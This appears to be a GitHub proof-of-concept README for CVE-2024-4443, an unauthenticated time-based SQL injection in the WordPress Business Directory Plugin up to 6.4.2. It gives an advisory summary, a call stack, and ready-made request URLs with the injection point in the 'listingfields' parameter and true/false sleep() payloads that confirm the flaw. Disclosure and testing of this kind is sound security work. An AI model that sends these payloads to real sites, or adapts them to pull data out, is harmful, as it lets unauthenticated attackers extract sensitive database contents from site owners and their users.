# CVE-2024-4443-Poc
CVE-2024-4443 Business Directory Plugin – Easy Listing Directories for WordPress &lt;= 6.4.2 - Unauthenticated SQL Injection via listingfields Parameter

Description

The Business Directory Plugin – Easy Listing Directories for WordPress plugin for WordPress is vulnerable to time-based SQL Injection via the ‘listingfields’ parameter in all versions up to, and including, 6.4.2 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database

https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/business-directory-plugin/business-directory-plugin-easy-listing-directories-for-wordpress-642-unauthenticated-sql-injection-via-listingfields-parameter

Call stack
```
WPBDP__Listing_Search->execute (\business-directory-plugin\includes\helpers\class-listing-search.php:88)
WPBDP__Listing_Search->_traverse_tree (\business-directory-plugin\includes\helpers\class-listing-search.php:185)
WPBDP__Listing_Search->__construct (\business-directory-plugin\includes\helpers\class-listing-search.php:35)
WPBDP__Listing_Search::parse_request (\business-directory-plugin\includes\helpers\class-listing-search.php:214)
WPBDP__Listing_Search::from_request (\business-directory-plugin\includes\helpers\class-listing-search.php:210)
WPBDP__Views__Search->dispatch (\business-directory-plugin\includes\controllers\pages\class-search.php:54)
```

Poc

Url: ```<Host>/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[{{Injection payload}}][1]=```

Url normal: ```<Host>/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[1]=``` 
![image](https://github.com/truonghuuphuc/CVE-2024-4443-Poc/assets/20487674/5a7c5a4b-773b-4976-8da7-8496873cf47b)


Url paload false: ```<Host>/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1=0,5,0))+))--+-][1]=```
![image](https://github.com/truonghuuphuc/CVE-2024-4443-Poc/assets/20487674/888c7053-456c-419b-b086-95add0fbbd4c)


Url paload true: ```<Host>/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1=1,5,0))+))--+-][1]=```
![image](https://github.com/truonghuuphuc/CVE-2024-4443-Poc/assets/20487674/8fffd986-6d31-4665-b057-afbb5ce13f56)


